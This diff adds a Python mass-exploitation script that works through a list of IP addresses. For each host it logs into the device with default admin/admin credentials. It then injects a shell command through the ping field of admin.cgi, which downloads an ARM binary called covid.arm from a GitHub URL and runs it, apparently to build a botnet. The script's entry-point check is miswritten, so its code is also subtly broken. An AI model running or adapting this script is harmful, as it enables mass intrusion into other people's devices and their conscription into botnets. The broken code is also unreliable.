@@ -1,0 +1,68 @@
+import sys
+import threading
+import requests
+import os
+from queue import Queue
+from threading import Thread
+
+ips = open(sys.argv[1], "r").readlines()
+queue = Queue()
+queue_count = 0
+
+def exploit(host):
+    try:
+        base_url = f"http://{host}"
+        login_url = f"{base_url}/login.cgi"
+        login_payload = {"username": "admin", "password": "admin", "login": "Login"}
+        login_headers = {
+            "Accept-Encoding": "gzip, deflate, br",
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Origin": base_url,
+            "Connection": "close"
+        }
+        session = requests.Session()
+        requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
+
+        resp = session.post(login_url, headers=login_headers, data=login_payload, verify=False)
+        if resp.status_code == 200 and "login failed" not in resp.text.lower():
+            command = "wget https://raw.githubusercontent.com/SOSINCHIK/sibaystreetlunacharskogo/refs/heads/main/covid.arm; chmod 777 covid.arm; ./covid.arm"
+            ping_ip = f"4.2.2.4||{command}"
+            data = {"ping_ip": ping_ip, "ping_timeout": "1", "textareai": "", "ping_start": "Ping"}
+            headers = {
+                "Accept-Encoding": "gzip, deflate, br",
+                "Content-Type": "application/x-www-form-urlencoded",
+                "Origin": base_url,
+                "Referer": f"{base_url}/admin.cgi?action=ping",
+                "Connection": "close"
+            }
+            exploit_url = f"{base_url}/admin.cgi?action=ping"
+            response = session.post(exploit_url, headers=headers, data=data, verify=False)
+            if any("root" in value for value in response.headers.values()):
+                print(f"[+] Successful: {host}")
+        else:
+            print(f"[-] Failed: {host}")
+    except:
+        pass
+
+def main():
+    global queue_count
+    for line in ips:
+        line = line.strip()
+        queue_count += 1
+        sys.stdout.write(f"\r[{queue_count}] Added to queue")
+        sys.stdout.flush()
+        queue.put(line)
+    sys.stdout.write("\n")
+    i = 0
+    while i != queue_count:
+        i += 1
+        try:
+            host = queue.get()
+            thread = Thread(target=exploit, args=(host,))
+            thread.start()
+        except KeyboardInterrupt:
+            os.kill(os.getpid(), 9)
+    thread.join()
+
+if name == "main":
+    main()
